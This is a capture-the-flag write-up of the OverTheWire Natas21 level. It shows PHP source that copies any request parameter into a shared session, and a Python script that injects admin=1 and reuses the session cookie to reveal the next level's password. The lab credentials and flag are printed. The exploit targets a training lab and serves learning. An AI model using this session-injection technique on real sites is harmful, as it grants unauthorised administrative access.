# CTF Writeup - **OverTheWire Natas20 - Natas21**

**Author**: spiketyson 

---

## Challenge Details

- **Challenge Name:** Natas20 - Natas21
- **Category:** Linux
- **Difficulty Level:** Easy
- **Date:** 20-12-2024

---

## Summary

This challenge is the introductory level for the Natas series on OverTheWire, focusing on web exploitation. The goal is to find the flag that is hidden web server using burpsuite if possible.

---

## Approach

Since this is an basic challenge, I planned to use python to find the flag using session hijacking.

---

## Solution Walkthrough

Connecting to the web server using:

```bash
Username: natas21
Password: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH
URL1:      http://natas21.natas.labs.overthewire.org
URL1:      http://natas21-experimenter.natas.labs.overthewire.org
```

After logging in, we can see that the webpage doesnot ask for any input. It has another webpage associated with it.

```bash
Note: this website is colocated with http://natas21-experimenter.natas.labs.overthewire.org
You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.
```

This is not very helpful. Lets view the source code since we know that the source code is in `http://natas21.natas.labs.overthewire.org/index-source.html`.

```bash
# <?php

# function print_credentials() { /* {{{ */
#     if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
#     print "You are an admin. The credentials for the next level are:<br>";
#     print "<pre>Username: natas22\n";
#     print "Password: <censored></pre>";
#     } else {
#     print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.";
#     }
# }
# /* }}} */

# session_start();
# print_credentials();

# ?>
```

We can see that this php code just checks if the session variable `admin` is `1` and prints the credentials. Intuitively we need to set the `admin` as `1`. But we dont have any option here. Lets explore the other site.

```bash
Note: this website is colocated with http://natas21.natas.labs.overthewire.org
Example: 
    Hello World!

Change example values here:
align: center
fontsize: 100%
bgcolor: yellow
```

This is interesting as we can update some values in here. Lets view the source code since we know that the source code is in `http://natas21-experimenter.natas.labs.overthewire.org/index-source.html`.

```bash
<?php

session_start();

// if update was submitted, store it
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
    $_SESSION[$key] = $val;
    }
}

if(array_key_exists("debug", $_GET)) {
    print "[DEBUG] Session contents:<br>";
    print_r($_SESSION);
}

// only allow these keys
$validkeys = array("align" => "center", "fontsize" => "100%", "bgcolor" => "yellow");
$form = "";

$form .= '<form action="index.php" method="POST">';
foreach($validkeys as $key => $defval) {
    $val = $defval;
    if(array_key_exists($key, $_SESSION)) {
    $val = $_SESSION[$key];
    } else {
    $_SESSION[$key] = $val;
    }
    $form .= "$key: <input name='$key' value='$val' /><br>";
}
$form .= '<input type="submit" name="submit" value="Update" />';
$form .= '</form>';

$style = "background-color: ".$_SESSION["bgcolor"]."; text-align: ".$_SESSION["align"]."; font-size: ".$_SESSION["fontsize"].";";
$example = "<div style='$style'>Hello world!</div>";

?>
```

Now we can see that the above php code gets executed whenever we submit the values. Initially it check if the update was submitted based on that it stores all the values sent to it in the session variable. This is very interesting to us as we can now send any parameter and it will be stored in the session. Then if checks if the `debug` is set and prints contents based on that. Finally it predifines some keys and prints them to the user and sets the default value if not updated. We can take advantage of the storing mechanism using the below code 

```bash
import requests

target = 'http://natas21-experimenter.natas.labs.overthewire.org?debug=true&submit=1&admin=1'
target1 = 'http://natas21.natas.labs.overthewire.org?debug=true'
auth = ('natas21','BPhv63cKE1lkQl04cE5CuFTzXe15NfiH')

session = requests.Session()

r = session.get(target, auth=auth)
print(r.text)
print(r.cookies["PHPSESSID"])

r = session.get(target1, cookies={"PHPSESSID": r.cookies["PHPSESSID"]}, auth=auth)
print(r.text)
```

The above script first tries sending the values using get parameter. `submit` is set to `1` to simulate the update, `admin` is set to `1` to store the variables in the session, and `debug` is set to `true` as we need to test if its working. Then it creates a new session to send the data and obtain the cookies set in the `PHPSESSIONID`. Then we are trying to go to the actually url using the same session to see if the session variable is set and view our password.


```bash
# <html>
# <head><link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css"></head>
# <body>
# <h1>natas21 - CSS style experimenter</h1>
# <div id="content">
# <p>
# <b>Note: this website is colocated with <a href="http://natas21.natas.labs.overthewire.org">http://natas21.natas.labs.overthewire.org</a></b>
# </p>
# [DEBUG] Session contents:<br>Array
# (
#     [debug] => true
#     [submit] => 1
#     [admin] => 1
# )

# <p>Example:</p>
# <div style='background-color: yellow; text-align: center; font-size: 100%;'>Hello world!</div>
# <p>Change example values here:</p>
# <form action="index.php" method="POST">align: <input name='align' value='center' /><br>fontsize: <input name='fontsize' value='100%' /><br>bgcolor: <input name='bgcolor' value='yellow' /><br><input type="submit" name="submit" value="Update" /></form>
# <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
# </div>
# </body>
# </html>

# n8s5c0s0drefh7uu60d5fr84p8
# <html>
# <head>
# <!-- This stuff in the header has nothing to do with the level -->
# <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
# <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
# <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
# <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
# <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
# <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>       
# <script>var wechallinfo = { "level": "natas21", "pass": "BPhv63cKE1lkQl04cE5CuFTzXe15NfiH" };</script></head>
# <body>
# <h1>natas21</h1>
# <div id="content">
# <p>
# <b>Note: this website is colocated with <a href="http://natas21-experimenter.natas.labs.overthewire.org">http://natas21-experimenter.natas.labs.overthewire.org</a></b>
# </p>

# You are an admin. The credentials for the next level are:<br><pre>Username: natas22
# Password: d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz</pre>
# <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
# </div>
# </body>
# </html>
```

We can see that the session stores the `data` the we send in session variables displayed by the `debug`. We are able to use the same cookies to obtain the credentials for the next level.

## Flag

**Flag:** d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz


---

## Lessons Learned

It was a hard challenge for me. I was to code the idea and identify the weakness but i didn't know how to exploit it using python. I learnt a lot on how to approach these types of challenges.